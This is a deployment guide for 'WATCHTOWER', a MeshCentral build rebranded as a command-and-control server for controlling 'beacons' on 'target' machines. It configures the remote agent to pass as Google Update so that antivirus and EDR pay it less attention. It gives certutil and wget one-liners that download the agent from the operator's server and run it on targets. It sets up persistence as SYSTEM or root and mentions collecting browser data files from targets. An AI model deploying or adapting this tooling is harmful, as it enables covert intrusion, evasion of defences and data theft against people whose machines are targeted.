# WATCHTOWER v1.0 — Deployment Guide

> WATCHTOWER is a customized build of **MeshCentral v1.1.57** with a Cobalt Strike-themed frontend.
> This guide covers installing it from scratch on a new Windows or Linux machine.

---

## What You're Deploying

| Component | Description |
|-----------|-------------|
| `meshcentral.js` + all source files | MeshCentral v1.1.57 Node.js server |
| `public/scripts/custom.js` | WATCHTOWER JS engine (~2659 lines) |
| `public/styles/custom.css` | WATCHTOWER dark theme (~3501 lines) |
| `public/images/wt-icons/*.svg` | 8 custom device icons |
| `meshcentral-data/config.json` | Server config (cert, ports, agent disguise) |

---

## Prerequisites

| Requirement | Windows | Linux |
|-------------|---------|-------|
| Node.js | v18+ (tested on v24.14.0) | v18+ |
| npm | Included with Node.js | Included with Node.js |
| Open ports | 80 (HTTP), 443 (HTTPS) | 80 (HTTP), 443 (HTTPS) |
| RAM | 512 MB minimum | 512 MB minimum |
| OS | Windows 10/11 or Server 2019+ | Ubuntu 20.04+, Debian 11+, any modern distro |

---

## Step 1 — Copy the Project Files

Copy the entire `MeshCentral-master` folder to the new machine.

**Windows:** Copy to any path, e.g.
```
C:\watchtower\MeshCentral-master\
```

**Linux:** Copy to any path, e.g.
```
/opt/watchtower/MeshCentral-master/
```

The folder must include:
```
MeshCentral-master/
├── meshcentral.js          ← main entry point
├── package.json
├── node_modules/           ← if present, skip Step 2
├── public/
│   ├── scripts/
│   │   └── custom.js       ← WATCHTOWER JS
│   ├── styles/
│   │   └── custom.css      ← WATCHTOWER CSS
│   └── images/
│       └── wt-icons/
│           ├── i1.svg → i8.svg   ← device icons
├── meshcentral-data/
│   └── config.json         ← server config
└── ...all other MeshCentral source files
```

> **Note:** The `meshcentral-data/` folder contains your config, TLS certs, and agent database.
> On a fresh install you only need `config.json`. Certs are auto-generated on first run.

---

## Step 2 — Install Node.js Dependencies

If `node_modules/` is missing or you want a clean install:

**Windows (Command Prompt or PowerShell):**
```cmd
cd C:\watchtower\MeshCentral-master
npm install
```

**Linux:**
```bash
cd /opt/watchtower/MeshCentral-master
npm install
```

This installs all dependencies listed in `package.json`. Takes 1–3 minutes.

---

## Step 3 — Create / Update the Config File

Create `meshcentral-data/config.json` with the content below.
**Replace `YOUR.SERVER.IP` with the actual LAN IP of this machine.**

```json
{
  "settings": {
    "cert": "YOUR.SERVER.IP",
    "port": 443,
    "redirPort": 80,
    "allowFraming": true
  },
  "domains": {
    "": {
      "newAccounts": false,
      "agentcustomization": {
        "filename": "GoogleUpdate",
        "servicename": "gupdate",
        "displayname": "Google Update Service (gupdate)",
        "companyname": "Google LLC"
      }
    }
  }
}
```

**To find your server's IP:**
- Windows: `ipconfig` → look for IPv4 Address
- Linux: `ip a` or `hostname -I`

> If you use a domain name instead of an IP, set `"cert": "yourdomain.com"` — MeshCentral will attempt to get a Let's Encrypt certificate automatically.

---

## Step 4 — Open Firewall Ports

### Windows Firewall
```powershell
# Run as Administrator
netsh advfirewall firewall add rule name="WATCHTOWER HTTPS" dir=in action=allow protocol=TCP localport=443
netsh advfirewall firewall add rule name="WATCHTOWER HTTP" dir=in action=allow protocol=TCP localport=80
```

Or via PowerShell:
```powershell
New-NetFirewallRule -DisplayName "WATCHTOWER HTTPS" -Direction Inbound -Protocol TCP -LocalPort 443 -Action Allow
New-NetFirewallRule -DisplayName "WATCHTOWER HTTP" -Direction Inbound -Protocol TCP -LocalPort 80 -Action Allow
```

### Linux (ufw)
```bash
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw reload
```

### Linux (iptables)
```bash
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT
```

---

## Step 5 — Start the Server

### Windows — Manual Start
Open a terminal in the project folder and run:
```cmd
"C:\Program Files\nodejs\node.exe" meshcentral.js
```
Or if `node` is in PATH:
```cmd
node meshcentral.js
```

**Expected output (success):**
```
MeshCentral HTTP redirection server running on port 80.
MeshCentral v1.1.57, Hybrid (LAN + WAN) mode.
MeshCentral HTTPS server running on 192.168.X.X:443.
```

> First run: MeshCentral auto-generates TLS certificates. This takes ~10 seconds.

### Linux — Manual Start
```bash
cd /opt/watchtower/MeshCentral-master
node meshcentral.js
```

### Linux — Start with logging
```bash
node meshcentral.js > /var/log/watchtower.log 2>&1 &
echo "PID: $!"
```

---

## Step 6 — First Login & Create Admin Account

1. Open a browser and go to: `https://YOUR.SERVER.IP`
2. Accept the self-signed certificate warning (click Advanced → Proceed)
3. You will be prompted to create the first admin account
4. Create your admin account (this is the only account — `newAccounts: false` blocks self-registration)

> **Recommended credentials for ops:** Use a strong password. The admin account has full access to all beacons.

---

## Step 7 — Verify WATCHTOWER is Loaded

After login, the main page should show:
- Black/dark background (`#0a0e14`)
- **WATCHTOWER v1.0** branding
- Toolbar with buttons: **LISTENERS | ◢ TOPO | ☰ OPS | ⬇ PAYLOAD | ▲ VAULT**
- Beacon table with renamed column headers (BEACON ID, STATUS, OPERATOR, etc.)

If the page looks like default MeshCentral (white/gray), clear your browser cache (`Ctrl+Shift+R`) — the browser may have cached old CSS/JS.

---

## Step 8 — Change the Server IP (if needed)

If you move the server to a different IP or the network changes:

1. Update `meshcentral-data/config.json`:
   ```json
   "cert": "NEW.IP.ADDRESS"
   ```

2. Delete old TLS certificates:
   - **Windows:** Delete all `.crt` and `.key` files in `meshcentral-data\`
   - **Linux:** `rm /opt/watchtower/MeshCentral-master/meshcentral-data/*.crt /opt/watchtower/MeshCentral-master/meshcentral-data/*.key`

3. Restart the server — new certs are auto-generated on startup.

4. Re-download and reinstall agents on all beacons (certs changed, old agents won't connect).

---

## Running as a Service (Persistent — Survives Reboot)

### Windows — NSSM (Non-Sucking Service Manager)

1. Download NSSM from https://nssm.cc/download
2. Run as Administrator:
```cmd
nssm install WATCHTOWER "C:\Program Files\nodejs\node.exe" "C:\watchtower\MeshCentral-master\meshcentral.js"
nssm set WATCHTOWER AppDirectory "C:\watchtower\MeshCentral-master"
nssm set WATCHTOWER AppStdout "C:\watchtower\watchtower.log"
nssm set WATCHTOWER AppStderr "C:\watchtower\watchtower.log"
nssm start WATCHTOWER
```

To check: `nssm status WATCHTOWER`
To stop: `nssm stop WATCHTOWER`
To remove: `nssm remove WATCHTOWER confirm`

### Windows — Task Scheduler (no extra tools)
```powershell
# Run as Administrator
$action = New-ScheduledTaskAction -Execute "C:\Program Files\nodejs\node.exe" -Argument "meshcentral.js" -WorkingDirectory "C:\watchtower\MeshCentral-master"
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "WATCHTOWER" -Action $action -Trigger $trigger -Principal $principal
```

### Linux — systemd Service

Create `/etc/systemd/system/watchtower.service`:
```ini
[Unit]
Description=WATCHTOWER C2 Server
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/watchtower/MeshCentral-master
ExecStart=/usr/bin/node meshcentral.js
Restart=always
RestartSec=10
StandardOutput=file:/var/log/watchtower.log
StandardError=file:/var/log/watchtower.log

[Install]
WantedBy=multi-user.target
```

Enable and start:
```bash
sudo systemctl daemon-reload
sudo systemctl enable watchtower
sudo systemctl start watchtower
sudo systemctl status watchtower
```

View logs:
```bash
journalctl -u watchtower -f
# or
tail -f /var/log/watchtower.log
```

### Linux — PM2 (Node.js process manager)
```bash
npm install -g pm2
cd /opt/watchtower/MeshCentral-master
pm2 start meshcentral.js --name watchtower
pm2 save
pm2 startup    # follow the printed command to enable on boot
```

---

## Binding Ports 80/443 on Linux (Non-Root)

Linux requires root to bind ports below 1024. Options:

### Option A — Run as root (simplest)
```bash
sudo node meshcentral.js
```

### Option B — Use authbind
```bash
sudo apt install authbind
sudo touch /etc/authbind/byport/80 /etc/authbind/byport/443
sudo chmod 500 /etc/authbind/byport/80 /etc/authbind/byport/443
sudo chown youruser /etc/authbind/byport/80 /etc/authbind/byport/443
authbind --deep node meshcentral.js
```

### Option C — Use setcap
```bash
sudo setcap cap_net_bind_service=+ep $(which node)
node meshcentral.js
```

### Option D — Change ports in config.json
```json
"port": 4443,
"redirPort": 8080
```
Then use a reverse proxy (nginx/caddy) to forward 443→4443 and 80→8080.

---

## Deploying Agents to Targets

After the server is running:

1. Log into WATCHTOWER UI
2. Create a **Device Group** (Mesh) — this becomes your "listener"
3. Open **Payload Studio** (⬇ PAYLOAD button in toolbar)
4. Select your listener from the dropdown
5. Choose the target OS tab (WINDOWS / LINUX / MACOS)
6. Copy the appropriate download URL or one-liner
7. Run on the target machine

**Windows agent one-liner (from CMD on target):**
```cmd
certutil -urlcache -split -f "https://YOUR.SERVER.IP/meshagents?id=3&meshid=MESHID" %TEMP%\GoogleUpdate.exe && %TEMP%\GoogleUpdate.exe run
```

**Linux agent one-liner:**
```bash
wget -q "https://YOUR.SERVER.IP/meshagents?id=6&meshid=MESHID" -O /tmp/gupdate && chmod +x /tmp/gupdate && /tmp/gupdate
```

The agent installs as a service named **gupdate** (Google Update disguise) and calls back to the server.

---

## Transferring to a New Machine (Migrating Existing Install)

To move an existing WATCHTOWER install with all agents, config, and database:

1. **Stop the server** on the old machine
2. **Copy the entire project folder** including `meshcentral-data/` (contains DB, certs, config)
3. **Update IP** in `meshcentral-data/config.json` if the new machine has a different IP
4. **Delete old certs** if IP changed (`*.crt`, `*.key` in `meshcentral-data/`)
5. **Run `npm install`** on new machine if `node_modules/` not copied
6. **Start server** on new machine
7. **Update DNS / hosts** so agents can find the new IP

> If you keep the same IP, agents reconnect automatically — no reinstall needed.
> If IP changes, agents will fail to connect — you'll need to redeploy them to targets.

---

## Troubleshooting

### Server starts on wrong port (444, 447, etc.)
Another process is holding port 443. Check and kill:
```cmd
# Windows
netstat -ano | findstr :443
taskkill /F /PID <pid>
```
```bash
# Linux
ss -tlnp | grep :443
kill -9 <pid>
```

### Page looks like default MeshCentral (not WATCHTOWER)
- Clear browser cache hard: `Ctrl+Shift+R` (or `Cmd+Shift+R` on Mac)
- Check `public/scripts/custom.js` and `public/styles/custom.css` exist and are not empty

### Agents not connecting after IP change
- Verify `"cert"` in `config.json` matches the server's actual IP
- Verify old certs were deleted before restart
- Test: `curl -k https://YOUR.NEW.IP/` — should return HTML

### Port 80/443 permission denied (Linux)
- Use `sudo`, `authbind`, or `setcap` as described in the Ports section above

### `npm install` fails
- Ensure Node.js v18+ is installed: `node --version`
- If behind a proxy: `npm config set proxy http://proxy:port`
- Try: `npm install --legacy-peer-deps`

### AMT port warning on startup
```
ERR: ERROR: MeshCentral Intel(R) AMT server port 4433 is not available.
```
This is **non-critical** — Intel AMT is not required. The server still runs normally. This warning appears if port 4433 is already taken by another process.

---

## Quick Reference — Server Commands

| Task | Windows | Linux |
|------|---------|-------|
| Start server | `node meshcentral.js` | `node meshcentral.js` |
| Start with log | `node meshcentral.js > server.log 2>&1` | `node meshcentral.js > server.log 2>&1 &` |
| Stop server | `Ctrl+C` or kill node.exe in Task Manager | `Ctrl+C` or `pkill -f meshcentral` |
| View log | `type server.log` | `tail -f server.log` |
| Check ports | `netstat -ano \| findstr :443` | `ss -tlnp \| grep :443` |
| Node version | `node --version` | `node --version` |

---

## Security Notes

- The self-signed TLS cert will show a browser warning — this is expected. Agents bypass cert validation by design (they pin the server's cert hash on first install).
- Change the default admin password immediately after first login on a new install.
- `newAccounts: false` in config.json prevents anyone from self-registering.
- The agent disguise (GoogleUpdate / gupdate) reduces AV/EDR attention on Windows targets.
- DBS output files (`EdgeData.json`, etc.) are written to `%TEMP%` on the **target** machine, not the server. Retrieve them via the Files tab in WATCHTOWER.
